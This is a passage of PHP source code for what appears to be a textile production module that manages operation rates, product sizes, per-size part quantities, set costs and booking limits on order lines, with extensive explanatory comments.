        $k = $c['stage_id'] . '|' . mb_strtolower($c['name']);
        if (isset($seen[$k])) return ['ok' => false, 'error' => 'Two lines both say "' . $c['name'] . '" at ' . $c['stage'] . '. Rename one, or delete it.'];
        $seen[$k] = true;
    }

    $existing = [];
    foreach (zp_part_ops($partId) as $o) $existing[(int)$o['id']] = $o;

    db()->beginTransaction();
    try {
        $keep = [];
        /* stage_id decides every rule; the stage NAME is written beside it only
           so the screens not yet converted keep reading. Both come from the same
           row, so they can never disagree. */
        $upd = db()->prepare("UPDATE zp_part_ops SET seq=?, stage_id=?, stage=?, operation_name=?, rate=?, is_active=1 WHERE id=? AND part_id=?");
        $ins = db()->prepare("INSERT INTO zp_part_ops (part_id, seq, stage_id, stage, operation_name, rate, is_active) VALUES (?,?,?,?,?,?,1)");
        foreach ($clean as $c) {
            if ($c['id'] > 0 && isset($existing[$c['id']])) {
                $old = (float)$existing[$c['id']]['rate'];
                $upd->execute([$c['seq'], $c['stage_id'], $c['stage'], $c['name'], $c['rate'], $c['id'], $partId]);
                if (abs($old - $c['rate']) > 0.004) {
                    zp_rate_log($c['id'], null, $part['part_name'], $c['name'], $old, $c['rate'], $reason, $userId);
                }
                $keep[] = $c['id'];
            } else {
                $ins->execute([$partId, $c['seq'], $c['stage_id'], $c['stage'], $c['name'], $c['rate']]);
                $newId = (int)db()->lastInsertId();
                zp_rate_log($newId, null, $part['part_name'], $c['name'], null, $c['rate'], $reason, $userId);
                $keep[] = $newId;
            }
        }

        /* rows the user removed from the grid */
        foreach ($existing as $oid => $o) {
            if (in_array($oid, $keep, true)) continue;
            $booked = db()->prepare("SELECT COUNT(*) FROM zp_entries WHERE op_id=? AND status='active'");
            $booked->execute([$oid]);
            if ((int)$booked->fetchColumn() > 0) {
                db()->prepare("UPDATE zp_part_ops SET is_active=0 WHERE id=?")->execute([$oid]);
            } else {
                db()->prepare("DELETE FROM zp_part_ops WHERE id=?")->execute([$oid]);
            }
        }
        db()->commit();
    } catch (Throwable $e) {
        db()->rollBack();
        return ['ok' => false, 'error' => 'Nothing was saved — the database refused the change. ' . $e->getMessage()];
    }
    return ['ok' => true, 'error' => ''];
}

function zp_rate_log(?int $opId, ?int $proformaId, ?string $partName, ?string $opName,
                     ?float $old, float $new, string $reason = '', ?int $userId = null): void {
    zp_ensure_schema();
    try {
        db()->prepare("INSERT INTO zp_rate_log (op_id, proforma_id, part_name, operation_name, old_rate, new_rate, reason, user_id)
                       VALUES (?,?,?,?,?,?,?,?)")
            ->execute([$opId, $proformaId, $partName, $opName, $old, $new, mb_substr(trim($reason), 0, 255), $userId]);
    } catch (Throwable $e) {}
}

/* THE RATE HISTORY, SCOPED.
 *
 * With no order given this is the whole log — the right thing when nobody has
 * picked an order yet.
 *
 * With an order given it answers only "what has moved that concerns THIS
 * order", which is two things and no more:
 *   - amendments made on this order itself, and
 *   - standard-rate changes to the operations this order actually uses.
 * A rate somebody amended on another customer's PO is not this order's
 * business and is not shown here. */
function zp_rate_log_read(int $limit = 200, ?int $proformaId = null, array $opIds = []): array {
    zp_ensure_schema();
    try {
        if ($proformaId === null || $proformaId <= 0) {
            return db()->query("SELECT * FROM zp_rate_log ORDER BY id DESC LIMIT " . (int)$limit)->fetchAll();
        }
        $ids = array_values(array_unique(array_map('intval', $opIds)));
        $where = "proforma_id = ?";
        $args  = [$proformaId];
        if ($ids) {
            $where .= " OR (proforma_id IS NULL AND op_id IN (" . implode(',', array_fill(0, count($ids), '?')) . "))";
            $args = array_merge($args, $ids);
        }
        $st = db()->prepare("SELECT * FROM zp_rate_log WHERE $where ORDER BY id DESC LIMIT " . (int)$limit);
        $st->execute($args);
        return $st->fetchAll();
    } catch (Throwable $e) { return []; }
}

/* The cost of making ONE of this part = every active operation added up.
   This is the only place that total is worked out, so the Part Library, the
   Product Master and the reports can never disagree about it. */
function zp_part_cost(int $partId): float {
    $t = 0.0;
    foreach (zp_part_ops($partId, true) as $o) $t += (float)$o['rate'];
    return round($t, 2);
}

/* Every part's cost in ONE query, for list screens.
   The old module asked per row and ran 300 queries to draw one table. */
function zp_part_cost_map(): array {
    zp_ensure_schema();
    $out = [];
    try {
        $rows = db()->query("SELECT part_id, SUM(rate) t FROM zp_part_ops WHERE is_active=1 GROUP BY part_id")->fetchAll();
        foreach ($rows as $r) $out[(int)$r['part_id']] = round((float)$r['t'], 2);
    } catch (Throwable $e) {}
    return $out;
}

function zp_part_op_count_map(): array {
    zp_ensure_schema();
    $out = [];
    try {
        $rows = db()->query("SELECT part_id, COUNT(*) c FROM zp_part_ops WHERE is_active=1 GROUP BY part_id")->fetchAll();
        foreach ($rows as $r) $out[(int)$r['part_id']] = (int)$r['c'];
    } catch (Throwable $e) {}
    return $out;
}

/* ============================================================
   PRODUCTS — read only. THIS MODULE NEVER DELETES A PRODUCT.
   ============================================================ */

function zp_products(bool $activeOnly = false): array {
    $sql = "SELECT id, name, category, default_unit, is_active FROM products"
         . ($activeOnly ? " WHERE is_active=1" : "") . " ORDER BY name";
    try { return db()->query($sql)->fetchAll(); } catch (Throwable $e) { return []; }
}

function zp_product(int $id): ?array {
    if ($id <= 0) return null;
    try {
        $st = db()->prepare("SELECT * FROM products WHERE id=?");
        $st->execute([$id]);
        $r = $st->fetch();
        return $r ?: null;
    } catch (Throwable $e) { return null; }
}

/* WHERE IS THIS PRODUCT USED — the "Used In" column in your layout.
 *
 * One query per table for ALL products, not one per product. Returns
 * [product_id => ['Production', 'Invoice']]. Each lookup is wrapped on its own
 * so a module that is not installed simply contributes nothing. */
function zp_usage_map(): array {
    zp_ensure_schema();
    $out = [];
    $add = function (int $pid, string $what) use (&$out) {
        if ($pid <= 0) return;
        if (!isset($out[$pid])) $out[$pid] = [];
        if (!in_array($what, $out[$pid], true)) $out[$pid][] = $what;
    };

    /* A CHECK THAT COULD NOT RUN MUST NEVER READ AS "NOT USED".
     *
     * Each lookup is wrapped so a module that is not installed contributes
     * nothing instead of breaking the page. But "this table threw" and "this
     * table is empty" produce the SAME empty result — and if that silence is
     * treated as proof, a product in use reads as free and Delete lights up.
     * The one case where being wrong is unrecoverable is the one where a
     * swallowed exception decides it.
     *
     * So a failed lookup is RECORDED under '__unknown'. Callers treat an
     * unknown as used, which is the safe direction to be wrong in: the worst
     * case is a Delete button that stays greyed out until somebody looks. */
    $unknown = [];
    try {
        foreach (db()->query("SELECT DISTINCT product_id FROM zp_entries WHERE status='active'")->fetchAll() as $r)
            $add((int)$r['product_id'], 'Production');
    } catch (Throwable $e) { $unknown[] = 'production entries'; }

    foreach ([['invoice_items', 'Invoice'], ['proforma_items', 'Proforma'], ['shipment_items', 'Shipment']] as [$tbl, $lbl]) {
        try {
            foreach (db()->query("SELECT DISTINCT product_id FROM `$tbl` WHERE product_id IS NOT NULL AND product_id > 0")->fetchAll() as $r)
                $add((int)$r['product_id'], $lbl);
        } catch (Throwable $e) { $unknown[] = str_replace('_', ' ', $tbl); }
    }
    if ($unknown) $out['__unknown'] = $unknown;
    return $out;
}

/* Is this product safe to delete? An unreadable table means NO. */
function zp_usage_unknown(array $map): array { return $map['__unknown'] ?? []; }

function zp_is_used(array $map, int $productId): bool {
    return !empty($map[$productId]) || !empty($map['__unknown']);
}

function zp_usage_label(array $map, int $productId): string {
    $u = $map[$productId] ?? [];
    if ($u) return 'Yes (' . implode(', ', $u) . ')';
    /* NOT "No" — we do not know. Saying No here is what would make a delete
       button appear for a product we simply failed to check. */
    $unk = zp_usage_unknown($map);
    if ($unk) return 'Could not be checked (' . implode(', ', array_slice($unk, 0, 2)) . ')';
    return 'No';
}

/* ============================================================
   SIZES
   ============================================================ */

/* ONE SIZE LIST FOR THE WHOLE APP, AND IT IS product_sizes.
 *
 * This used to read zp_sizes, and that was the mistake behind the whole size
 * mess. product_sizes is read by SEVENTEEN files — Costing, Proforma, Search,
 * both print screens, Final Costing, the AI screens. zp_sizes was read by
 * three, all of them mine. Putting the new module on its own table meant a size
 * typed in Product Master never reached any of the other seventeen, and I then
 * wrote a bridge to copy between them, which is a workaround for a table that
 * should never have existed.
 *
 * The old zp_sizes table is LEFT ON DISK, untouched. Nothing reads it any more,
 * but it is the only copy of what was typed before this change, so it stays.
 *
 * The shape returned is unchanged — id and size_label — so every caller works
 * exactly as before and simply sees the real list now. */
function zp_sizes(int $productId): array {
    if ($productId <= 0) return [];
    zp_ensure_schema();
    try {
        $st = db()->prepare("SELECT id, product_id, size_label, COALESCE(sort_order,0) sort_order
                             FROM product_sizes WHERE product_id=? ORDER BY sort_order, id");
        $st->execute([$productId]);
        return $st->fetchAll();
    } catch (Throwable $e) { return []; }
}

/* IS ANYTHING POINTING AT THIS SIZE?
 *
 * A size id in product_sizes is not mine to delete. costing_version_sizes
 * points at it, and so may a proforma line — removing one would orphan a
 * costing somebody already approved, or a line on an order already sent.
 *
 * Every referrer is asked, and A CHECK THAT CANNOT RUN COUNTS AS "IN USE":
 * an unreadable table is not evidence that nothing needs this row. */
function zp_size_refs(int $sizeId): array {
    $where = [];
    $ask = function (string $sql, int $id) use (&$where) {
        try {
            $st = db()->prepare($sql); $st->execute([$id]);
            return (int)$st->fetchColumn();
        } catch (Throwable $e) {
            $m = $e->getMessage();
            /* a table or column that genuinely does not exist holds nothing */
            if (stripos($m, 'exist') !== false || stripos($m, 'Unknown column') !== false) return 0;
            return -1;                                   // unreadable = treat as used
        }
    };
    $checks = [
        'a costing'   => "SELECT COUNT(*) FROM costing_version_sizes WHERE product_size_id=?",
        'a proforma'  => "SELECT COUNT(*) FROM proforma_items WHERE product_size_id=?",
        'quantities'  => "SELECT COUNT(*) FROM zp_part_qty WHERE size_id=? AND qty<>1",
        /* NO "<>" HERE, UNLIKE QUANTITIES. A zp_part_qty row of 1 is the
           default and carries no information, so it does not count as use. But
           zp_op_rate holds no defaults at all — somebody typed every row in it
           on purpose, so any row is real. */
        'size rates'  => "SELECT COUNT(*) FROM zp_op_rate WHERE size_id=?",
    ];
    foreach ($checks as $label => $sql) {
        $n = $ask($sql, $sizeId);
        if ($n !== 0) $where[] = $n < 0 ? $label . ' (could not be checked)' : $label;
    }
    return $where;
}

/* Replace the whole size list for a product.
   A size you take off the list IS removed, even if something pointed at it.
   The caller is told which ones carried something and what that was, so the
   removal is informed rather than either refused or silent. */
function zp_save_sizes(int $productId, array $labels): array {
    zp_ensure_schema();
    if ($productId <= 0) return ['ok' => false, 'error' => 'No product.', 'dropped' => []];

    $clean = []; $seen = [];
    foreach ($labels as $l) {
        $l = trim((string)$l);
        if ($l === '') continue;
        $k = mb_strtolower($l);
        if (isset($seen[$k])) continue;         // typed twice — keep the first
        $seen[$k] = true;
        $clean[] = mb_substr($l, 0, 60);
    }

    $existing = zp_sizes($productId);
    $byLabel = [];
    foreach ($existing as $s) $byLabel[mb_strtolower($s['size_label'])] = $s;

    $dropped = [];
    db()->beginTransaction();
    try {
        /* A SIZE IS REMOVED ONLY WHEN NOTHING ANYWHERE POINTS AT IT.
           These ids are shared with Costing and Proforma now, so the old rule —
           "delete it if it carries no quantity" — is nowhere near careful
           enough. Anything still referenced is KEPT and reported by name, so
           the list on screen always matches what is really stored. */
        /* A SIZE YOU TOOK OFF THE LIST COMES OFF THE LIST.
           This used to REFUSE, keeping any size that a costing, a proforma or a
           quantity pointed at. That was safe and it was annoying: a size typed
           by mistake could never be removed once anything had touched it, and
           the screen then disagreed with what you had just typed.
           Your call, and it is the right one — a rate is a number you can type
           again. So the removal always happens; what changes is that it now
           says what it took with it, instead of either refusing or going quiet.

           ONE CONSEQUENCE WORTH KNOWING, which is why it is reported rather
           than silent: proforma_items.product_size_id goes dead, so
           zp_pieces_needed() returns ZP_NO_SIZE and THAT ORDER LINE CANNOT BE
           BOOKED until a size is linked again. Wages already booked are safe —
           every entry froze its own rate — but no new ones can go on. Daily
           Entry names the line in its red banner, so it is findable. */
        foreach ($existing as $s) {
            if (isset($seen[mb_strtolower($s['size_label'])])) continue;
            $sid  = (int)$s['id'];
            $refs = zp_size_refs($sid);
            if ($refs) $dropped[] = $s['size_label'] . ' (it was used by ' . implode(', ', $refs) . ')';
            db()->prepare("DELETE FROM zp_op_rate  WHERE size_id=?")->execute([$sid]);
            db()->prepare("DELETE FROM zp_part_qty WHERE size_id=?")->execute([$sid]);
            db()->prepare("DELETE FROM product_sizes WHERE id=?")->execute([$sid]);
        }
        /* add the new ones, in the order given */
        $ins = db()->prepare("INSERT INTO product_sizes (product_id, size_label, sort_order) VALUES (?,?,?)");
        $upd = db()->prepare("UPDATE product_sizes SET sort_order=? WHERE id=?");
        foreach ($clean as $i => $l) {
            $have = $byLabel[mb_strtolower($l)] ?? null;
            if ($have) $upd->execute([$i, (int)$have['id']]);
            else       $ins->execute([$productId, $l, $i]);
        }
        db()->commit();
    } catch (Throwable $e) {
        db()->rollBack();
        return ['ok' => false, 'error' => 'Nothing was saved. ' . $e->getMessage(), 'dropped' => []];
    }
    return ['ok' => true, 'error' => '', 'dropped' => $dropped];
}

/* ============================================================
   THE ONE-TIME MOVE FROM zp_sizes TO product_sizes
   ============================================================

   Quantities typed before this change are keyed by zp_sizes ids. They are
   re-pointed at the matching product_sizes row, matched on the label.

   NOTHING IS DELETED. The zp_sizes table stays exactly as it is — it is the
   only record of what was typed, and if any of this is wrong it is the only way
   back. A size in zp_sizes with no twin in product_sizes is CREATED there
   rather than dropped, so "pillow = 2 on Double" survives even if Double only
   ever existed on the production side.

   IT RUNS ONCE. A marker row records that, because re-running after somebody
   renamed a size would re-point quantities at the wrong row. */
function zp_meta_get(string $k): string {
    try {
        db()->exec("CREATE TABLE IF NOT EXISTS zp_meta (k VARCHAR(60) PRIMARY KEY, v VARCHAR(255) NULL)");
        $st = db()->prepare("SELECT v FROM zp_meta WHERE k=?"); $st->execute([$k]);
        $v = $st->fetchColumn();
        return $v === false ? '' : (string)$v;
    } catch (Throwable $e) { return ''; }
}
function zp_meta_set(string $k, string $v): void {
    try {
        db()->prepare("INSERT INTO zp_meta (k,v) VALUES (?,?) ON DUPLICATE KEY UPDATE v=VALUES(v)")
            ->execute([$k, $v]);
    } catch (Throwable $e) {}
}

function zp_size_migrate(bool $force = false): array {
    zp_ensure_schema();
    if (!$force && zp_meta_get('size_merge') !== '')
        return ['ran' => false, 'moved' => 0, 'added' => 0, 'note' => 'Already done on ' . zp_meta_get('size_merge')];

    $moved = 0; $added = 0;
    try {
        $old = db()->query("SELECT id, product_id, size_label FROM zp_sizes ORDER BY product_id, id")->fetchAll();
    } catch (Throwable $e) {
        zp_meta_set('size_merge', date('Y-m-d H:i'));
        return ['ran' => true, 'moved' => 0, 'added' => 0, 'note' => 'There was no old size table to move.'];
    }
    if (!$old) {
        zp_meta_set('size_merge', date('Y-m-d H:i'));
        return ['ran' => true, 'moved' => 0, 'added' => 0, 'note' => 'The old size table was empty.'];
    }

    try {
        $byProduct = [];
        foreach (db()->query("SELECT id, product_id, size_label FROM product_sizes")->fetchAll() as $r)
            $byProduct[(int)$r['product_id']][mb_strtolower(trim($r['size_label']))] = (int)$r['id'];

        $ins  = db()->prepare("INSERT INTO product_sizes (product_id, size_label) VALUES (?,?)");
        $move = db()->prepare("UPDATE zp_part_qty SET size_id=? WHERE size_id=? AND product_id=?");
        foreach ($old as $o) {
            $pid = (int)$o['product_id'];
            $key = mb_strtolower(trim((string)$o['size_label']));
            if ($key === '') continue;
            $newId = $byProduct[$pid][$key] ?? 0;
            if (!$newId) {
                $ins->execute([$pid, trim((string)$o['size_label'])]);
                $newId = (int)db()->lastInsertId();
                $byProduct[$pid][$key] = $newId;
                $added++;
            }
            if ($newId !== (int)$o['id']) {
                $move->execute([$newId, (int)$o['id'], $pid]);
                $moved += $move->rowCount();
            }
        }
    } catch (Throwable $e) {
        return ['ran' => false, 'moved' => $moved, 'added' => $added,
                'note' => 'Stopped part-way: ' . $e->getMessage() . ' Nothing was deleted, so it is safe to run again.'];
    }
    zp_meta_set('size_merge', date('Y-m-d H:i'));
    return ['ran' => true, 'moved' => $moved, 'added' => $added, 'note' => ''];
}

/* ============================================================
   PRODUCT PARTS AND PER-SIZE QUANTITIES
   ============================================================ */

function zp_product_parts(int $productId): array {
    if ($productId <= 0) return [];
    zp_ensure_schema();
    $st = db()->prepare("SELECT pp.id link_id, pp.sort_order, p.*
                         FROM zp_product_parts pp JOIN zp_parts p ON p.id = pp.part_id
                         WHERE pp.product_id=? ORDER BY pp.sort_order, pp.id");
    $st->execute([$productId]);
    return $st->fetchAll();
}

function zp_add_product_part(int $productId, int $partId): array {
    zp_ensure_schema();
    if ($productId <= 0 || $partId <= 0) return ['ok' => false, 'error' => 'Pick a part first.'];
    if (!zp_part($partId)) return ['ok' => false, 'error' => 'That part no longer exists.'];
    $has = db()->prepare("SELECT COUNT(*) FROM zp_product_parts WHERE product_id=? AND part_id=?");
    $has->execute([$productId, $partId]);
    if ((int)$has->fetchColumn()) return ['ok' => false, 'error' => 'That part is already on this product.'];
    $n = db()->prepare("SELECT COALESCE(MAX(sort_order),-1)+1 FROM zp_product_parts WHERE product_id=?");
    $n->execute([$productId]);
    db()->prepare("INSERT INTO zp_product_parts (product_id, part_id, sort_order) VALUES (?,?,?)")
        ->execute([$productId, $partId, (int)$n->fetchColumn()]);
    return ['ok' => true, 'error' => ''];
}

/* Taking a part OFF a product removes its quantities too — they describe a
   relationship that no longer exists. Wages already booked are NOT touched:
   they are history, and history is not edited by changing a recipe. */
function zp_remove_product_part(int $productId, int $partId): void {
    zp_ensure_schema();
    db()->prepare("DELETE FROM zp_part_qty WHERE product_id=? AND part_id=?")->execute([$productId, $partId]);
    db()->prepare("DELETE FROM zp_product_parts WHERE product_id=? AND part_id=?")->execute([$productId, $partId]);
}

/* [part_id][size_id] => qty. A MISSING ROW MEANS 1, NOT 0.
   A part that is on the product is in it at least once; defaulting to 0 would
   make a product quietly produce nothing and look like it was working. */
function zp_qty_map(int $productId): array {
    if ($productId <= 0) return [];
    zp_ensure_schema();
    $out = [];
    $st = db()->prepare("SELECT part_id, size_id, qty FROM zp_part_qty WHERE product_id=?");
    $st->execute([$productId]);
    foreach ($st->fetchAll() as $r) $out[(int)$r['part_id']][(int)$r['size_id']] = (float)$r['qty'];
    return $out;
}

function zp_qty_for(array $map, int $partId, int $sizeId): float {
    return isset($map[$partId][$sizeId]) ? (float)$map[$partId][$sizeId] : 1.0;
}

/* $qty = [part_id => [size_id => qty]] */
function zp_save_qty(int $productId, array $qty): array {
    zp_ensure_schema();
    if ($productId <= 0) return ['ok' => false, 'error' => 'No product.'];
    db()->beginTransaction();
    try {
        $ins = db()->prepare("INSERT INTO zp_part_qty (product_id, part_id, size_id, qty) VALUES (?,?,?,?)
                              ON DUPLICATE KEY UPDATE qty=VALUES(qty)");
        foreach ($qty as $partId => $bySize) {
            foreach ($bySize as $sizeId => $q) {
                $q = (float)str_replace(',', '', (string)$q);
                if ($q < 0) $q = 0;
                $ins->execute([$productId, (int)$partId, (int)$sizeId, round($q, 2)]);
            }
        }
        db()->commit();
    } catch (Throwable $e) {
        db()->rollBack();
        return ['ok' => false, 'error' => 'Nothing was saved. ' . $e->getMessage()];
    }
    return ['ok' => true, 'error' => ''];
}

/* What one SET of this product costs to make, at one size:
   every part's operation total x how many of that part go in. */
/* TWO THINGS VARY BY SIZE, AND THEY ARE DIFFERENT THINGS.
     HOW MANY   zp_part_qty  — a Double set has 2 pillow cases, a Single has 1
     HOW MUCH   zp_op_rate   — a King seam is longer, so overlocking pays more
   This used to multiply zp_part_cost(), which sums an operation's rate with no
   idea a size exists. It now walks the operations itself so a size rate is
   actually counted — without it, Product Master would print one set cost while
   the wages paid another. */
function zp_set_cost(int $productId, int $sizeId): float {
    $qty   = zp_qty_map($productId);
    $rates = zp_op_rate_map($productId);
    $t = 0.0;
    foreach (zp_product_parts($productId) as $p) {
        $partId = (int)$p['id'];
        $one = 0.0;
        foreach (zp_part_ops($partId, true) as $o) {
            $one += zp_rate_for((int)$o['id'], (float)$o['rate'], [], $rates, $sizeId);
        }
        $t += $one * zp_qty_for($qty, $partId, $sizeId);
    }
    return round($t, 2);
}

/* ============================================================
   WHAT IS STILL MISSING BEFORE A PRODUCT CAN BE PRODUCED
   ============================================================

   Returns plain sentences. Each one names the thing AND what to do about it —
   a checklist that tells you a fact but not the next action is just a
   complaint. */
function zp_product_todo(int $productId): array {
    $todo = [];
    $sizes = zp_sizes($productId);
    $parts = zp_product_parts($productId);
    if (!$sizes) $todo[] = 'No sizes yet — add them on the Basic Info tab, then come back.';
    if (!$parts) $todo[] = 'No parts yet — press "Add Parts from Library" to choose what this product is made of.';
    foreach ($parts as $p) {
        $ops = zp_part_ops((int)$p['id'], true);
        if (!$ops) {
            $todo[] = '"' . $p['part_name'] . '" has no operations — open it in the Part Library and add its Cutting line first.';
            continue;
        }
        $hasCut = false;
        foreach ($ops as $o) if (zp_is_cutting($o['stage'])) { $hasCut = true; break; }
        if (!$hasCut) $todo[] = '"' . $p['part_name'] . '" has no Cutting line, so nothing sets how many pieces exist.';
    }
    return $todo;
}

/* ============================================================
   ORDERS — which proforma lines are being produced
   ============================================================

   `proforma_invoices.production_enabled` is an existing column and this module
   reads it. It is the ONE thing here that touches an existing table, and only
   to switch a flag the old module already used, so nothing is invented and
   nothing is lost. */
function zp_orders_schema(): void {
    try { db()->exec("ALTER TABLE proforma_invoices ADD COLUMN production_enabled TINYINT(1) NOT NULL DEFAULT 0"); } catch (Throwable $e) {}
}

/* Resolve an order line to a master product: by the stored link first, then by
   name. The stored link is authoritative — a line renamed on the invoice must
   still produce the same product. */
function zp_resolve_item(array $row): int {
    $pid = (int)($row['product_id'] ?? 0);
    if ($pid > 0) return $pid;
    $name = trim((string)($row['product_name'] ?? ''));
    if ($name === '') return 0;
    static $byName = null;
    if ($byName === null) {
        $byName = [];
        try {
            foreach (db()->query("SELECT id, name FROM products")->fetchAll() as $p)
                $byName[mb_strtolower(trim($p['name']))] = (int)$p['id'];
        } catch (Throwable $e) {}
    }
    return $byName[mb_strtolower($name)] ?? 0;
}

/* Every order line switched on for production, already resolved. */
function zp_open_lines(): array {
    zp_ensure_schema(); zp_orders_schema();
    $out = [];
    try {
        $rows = db()->query("SELECT pi.id item_id, pi.proforma_id, pi.product_name, pi.product_id,
                                    pi.qty ordered_qty, pi.size, pi.product_size_id, pf.pi_no, pf.customer_name
                             FROM proforma_items pi
                             JOIN proforma_invoices pf ON pf.id = pi.proforma_id
                             WHERE pf.production_enabled = 1
                             ORDER BY pf.id DESC, pi.id")->fetchAll();
    } catch (Throwable $e) { return []; }
    foreach ($rows as $r) {
        $pid = zp_resolve_item($r);
        if (!$pid) continue;                       // a line matching no product cannot be produced
        $r['product_id'] = $pid;
        $out[] = $r;
    }
    return $out;
}

/* ============================================================
   PROGRESS — what has actually been booked
   ============================================================

   ONE QUERY for the whole screen, not one per line. Returns
   [item_id][part_id][op_id] => qty, and a stage roll-up alongside it.
   Cancelled rows are excluded here, which is the single place that decision is
   made — so a cancelled entry can never still be holding a limit down. */
function zp_progress_map(): array {
    zp_ensure_schema();
    $out = ['op' => [], 'stage' => [], 'set' => []];
    /* ONE QUERY, WRITTEN OUT IN FULL, and that is deliberate on two counts.
       Cancelled rows are excluded HERE and nowhere else, so a cancelled entry
       can never still be holding a limit down. And nothing in it is built
       from a variable — the first draft interpolated the WHERE clause to
       share it with a fallback query, and this module's own security test
       caught it. A rule worth having is worth not making an exception to.

       op_kind is added by zp_ensure_schema() on the line above, the same way
       every other column and table in this module arrives. There is no
       fallback for it missing, for the same reason there is none for
       zp_entries missing: if the schema cannot be written the app has to say
       so, not half-work. */
    try {
        $rows = db()->query("SELECT proforma_item_id, COALESCE(part_id,0) part_id, op_id,
                                    COALESCE(op_kind,'part') op_kind, stage, SUM(qty) q
                             FROM zp_entries WHERE status='active'
                             GROUP BY proforma_item_id, part_id, op_id, op_kind, stage")->fetchAll();
    } catch (Throwable $e) { return $out; }
    foreach ($rows as $r) {
        $it = (int)$r['proforma_item_id'];
        $kind = (string)$r['op_kind'];
        /* SET WORK IS COUNTED IN A PLACE OF ITS OWN, and that is the point.
           It is measured in SETS, part work in pieces. Adding them into one
           bucket would let 200 folds look like 200 cushion covers, and the
           ceiling on every part would move for a reason nobody could see. */
        if ($kind === 'set' || $kind === 'line') {
            $op = (int)$r['op_id'];
            $out['set'][$it][$kind][$op] = ((float)($out['set'][$it][$kind][$op] ?? 0)) + (float)$r['q'];
            continue;
        }
        $pt = (int)$r['part_id'];
        $out['op'][$it][$pt][(int)$r['op_id']] = (float)$r['q'];
        $key = zp_is_cutting($r['stage']) ? 'cut' : 'stitched';
        $out['stage'][$it][$pt][$key] = ((float)($out['stage'][$it][$pt][$key] ?? 0)) + (float)$r['q'];
    }
    return $out;
}

/* HOW MANY PIECES OF THIS PART ONE ORDER LINE NEEDS.
   ordered sets x how many of that part go into one set, at that line's size. */
/* WHICH SIZE IS THIS ORDER LINE?
 *
 * BY ID FIRST. The proforma line now carries product_size_id, so there is
 * nothing to guess — it is the same row Costing priced and the same row
 * Product Master typed.
 *
 * BY LABEL ONLY AS A FALLBACK, for lines written before that column existed.
 * Matching on typed text is exactly how the old bug worked, so it is the second
 * answer here, never the first.
 *
 * Returns 0 when neither resolves. The caller must then REFUSE, not assume. */
function zp_line_size_id(array $line): int {
    $sid = (int)($line['product_size_id'] ?? 0);
    if ($sid > 0) return $sid;
    $want = mb_strtolower(trim((string)($line['size'] ?? '')));
    if ($want === '') return 0;
    foreach (zp_sizes((int)$line['product_id']) as $s)
        if (mb_strtolower(trim($s['size_label'])) === $want) return (int)$s['id'];
    return 0;
}

/* HOW MANY PIECES OF THIS PART ONE ORDER LINE NEEDS.
 *
 * ordered sets x how many of that part go into one set, AT THAT LINE'S SIZE.
 * A Double using two pillow cases needs TWO per set — 500 sets is 1,000
 * overlocks, not 500.
 *
 * WHY THERE IS NO LONGER A FALLBACK OF 1.
 *
 * This used to return `ordered x 1` when the size matched nothing, defended on
 * the grounds that 1 is better than 0. That was the wrong pair of options. The
 * real choice was between GUESSING and SAYING SO, and guessing is worse here
 * because it always guesses LOW: a Double that really takes two pillow cases
 * gets planned as one, the order reads finished at half done, and half the
 * wages are never bookable. The number is wrong and nothing on any screen says
 * so.
 *
 * So an unresolvable size now returns -1, which means "I cannot plan this
 * line". The entry screen shows it in red and names the order, the product and
 * the size, and nothing can be booked against it until the size is linked. */
const ZP_NO_SIZE = -1.0;

function zp_pieces_needed(array $line, int $partId): float {
    $pid    = (int)$line['product_id'];
    $sizeId = zp_line_size_id($line);
    if ($sizeId <= 0) return ZP_NO_SIZE;
    return (float)$line['ordered_qty'] * zp_qty_for(zp_qty_map($pid), $partId, $sizeId);
}

/* Why a line cannot be planned, in words somebody can act on. */
function zp_size_problem(array $line): string {
    if (zp_line_size_id($line) > 0) return '';
    $size = trim((string)($line['size'] ?? ''));
    $have = array_column(zp_sizes((int)$line['product_id']), 'size_label');
    return $size === ''
        ? 'No size is set on this line of ' . (string)($line['pi_no'] ?? 'the order')
          . ', so the pieces per set cannot be worked out.'
        : (string)($line['pi_no'] ?? 'This order') . ' says "' . $size . '", but '
          . (string)($line['product_name'] ?? 'that product') . ' has '
          . ($have ? 'only ' . implode(', ', $have) : 'no sizes at all')
          . '. Link the size on the proforma line.';
}

/* HOW MANY CAN STILL BE BOOKED against one operation of one part on one line.
 *
 * Two ceilings, and the tighter one wins:
 *
 *   CUTTING      capped by what the order needs. Cutting is what creates
 *                pieces, so the plan is the only thing that can cap it.
 *   STITCHING    capped by what has actually been CUT — never by the plan.
 *                Stitching 500 when 300 were cut is not ambition, it is a
 *                mistake or a mis-credit, and the number should refuse it.
 *
 * AND each operation is capped by ITS OWN booked total. Two stitching
 * operations on the same part (Overlock and Singer) each get the full
 * allowance, because each is a separate job done to every piece. Capping them
 * against a shared pool was a real bug in the old module: booking 150 on one
 * silently ate the other's allowance. */
function zp_remaining(array $line, int $partId, int $opId, string $stage, array $prog): float {
    $itemId = (int)$line['item_id'];
    $needed = zp_pieces_needed($line, $partId);
    /* A LINE WHOSE SIZE CANNOT BE RESOLVED ALLOWS NOTHING.
       Letting ZP_NO_SIZE through would make the ceiling negative and max(0,...)
       would turn that into a flat zero — which reads on screen exactly like
       "this is finished". Refusing explicitly is the only honest answer, and
       zp_size_problem() is what tells the person why. */
    if ($needed === ZP_NO_SIZE) return 0.0;
    $done   = (float)($prog['op'][$itemId][$partId][$opId] ?? 0);
    if (zp_is_cutting($stage)) {
        $ceiling = $needed;
    } else {
        $cut = (float)($prog['stage'][$itemId][$partId]['cut'] ?? 0);
        $ceiling = min($needed, $cut);
    }
    return max(0.0, $ceiling - $done);
}

/* THE RATE THIS ORDER ACTUALLY PAYS.
   The part's standard rate, unless this order carries an approved amendment. */
function zp_order_rate_map(int $proformaId): array {
    zp_ensure_schema();
    $out = [];
    if ($proformaId <= 0) return $out;
    try {
        $st = db()->prepare("SELECT op_id, rate FROM zp_order_rates WHERE proforma_id=?");
        $st->execute([$proformaId]);
        foreach ($st->fetchAll() as $r) $out[(int)$r['op_id']] = (float)$r['rate'];
    } catch (Throwable $e) {}
    return $out;
}
/* ============================================================
   RATES THAT DIFFER BY SIZE
   ============================================================ */

/* [part_op_id][size_id] => rate, for one product. Same shape as zp_qty_map(). */
function zp_op_rate_map(int $productId, bool $fresh = false): array {
    /* zp_work_index() asks for this once per ORDER LINE, and a busy floor has
       hundreds. Held for the request so it is one query per product.
       $fresh re-reads — the save uses it, so a page that saves and then draws
       the grid again in the same request cannot show pre-save numbers. */
    static $cache = [];
    if ($fresh) $cache = [];
    if ($productId <= 0) return [];
    if (isset($cache[$productId])) return $cache[$productId];
    zp_ensure_schema();
    $out = [];
    try {
